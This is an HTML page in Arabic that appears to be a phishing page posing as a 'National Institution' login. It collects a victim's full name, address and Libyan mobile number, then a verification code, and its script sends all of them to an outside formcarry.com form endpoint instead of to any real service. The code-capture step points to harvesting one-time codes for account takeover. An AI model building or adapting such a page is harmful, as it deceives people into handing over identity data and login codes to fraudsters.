<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>تسجيل الدخول - المؤسسة الوطنية</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      background-color: #f0f2f5;
      font-family: "Cairo", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 400px;
      background: #fff;
      padding: 16px 20px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      box-sizing: border-box;
    }
    label {
      font-weight: bold;
      margin: 6px 0 4px;
      display: block;
      font-size: 14px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
      margin-bottom: 10px;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .row > div {
      flex: 1;
    }
    button {
      background-color: #002147;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #003366;
    }
    .timer {
      text-align: center;
      font-weight: bold;
      color: #006400;
      margin-bottom: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="form">
      <label>الاسم الكامل:</label>
      <input type="text" id="fullname" name="fullname" required pattern="^[\u0600-\u06FF\s]+$" title="الرجاء كتابة الاسم باللغة العربية فقط." />

      <label>العنوان (المنطقة والمدينة):</label>
      <input type="text" id="address" name="address" required placeholder="مثال: تاجوراء - طرابلس" />

      <label>رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" placeholder="+218xxxxxxxxx" pattern="^\+2189[1-9][0-9]{7}$" required />

      <button type="button" onclick="sendPhone()">طلب الكود</button>
      <div class="timer" id="countdown" style="display: none">120 ثانية</div>

      <label>رمز الكود:</label>
      <input type="text" id="code" name="code" placeholder="6 إلى 8 أرقام أو حروف" required pattern="[A-Za-z0-9]{6,8}" />

      <button type="button" onclick="submitWithCode()">تأكيد الكود وإرسال البيانات</button>
    </form>
  </div>

  <script>
    function sendPhone() {
      const phoneInput = document.getElementById("phone");
      if (!phoneInput.checkValidity()) {
        alert("يرجى إدخال رقم هاتف صالح.");
        return;
      }

      const formData = new FormData();
      formData.append("phone", phoneInput.value);

      fetch("https://formcarry.com/s/ldfA_DUCDrk", {
        method: "POST",
        body: formData,
      })
        .then(() => {
          alert("تم إرسال رقم الهاتف وطلب الكود بنجاح.");
          startCountdown();
        })
        .catch(() => {
          alert("حدث خطأ أثناء الإرسال. حاول لاحقاً.");
        });
    }

    function submitWithCode() {
      const form = document.getElementById("form");

      if (!form.checkValidity()) {
        alert("يرجى تعبئة جميع الحقول بشكل صحيح.");
        return;
      }

      const formData = new FormData(form);

      fetch("https://formcarry.com/s/ldfA_DUCDrk", {
        method: "POST",
        body: formData,
      })
        .then(() => {
          window.location.href = "success.html"; // ← غيره إذا أردت صفحة أخرى
        })
        .catch(() => {
          alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
        });
    }

    function startCountdown() {
      let time = 120;
      const countdown = document.getElementById("countdown");
      countdown.style.display = "block";
      countdown.textContent = time + " ثانية";
      const interval = setInterval(() => {
        time--;
        countdown.textContent = time + " ثانية";
        if (time <= 0) {
          clearInterval(interval);
          countdown.textContent = "انتهى الوقت";
        }
      }, 1000);
    }
  </script>
</body>
</html>
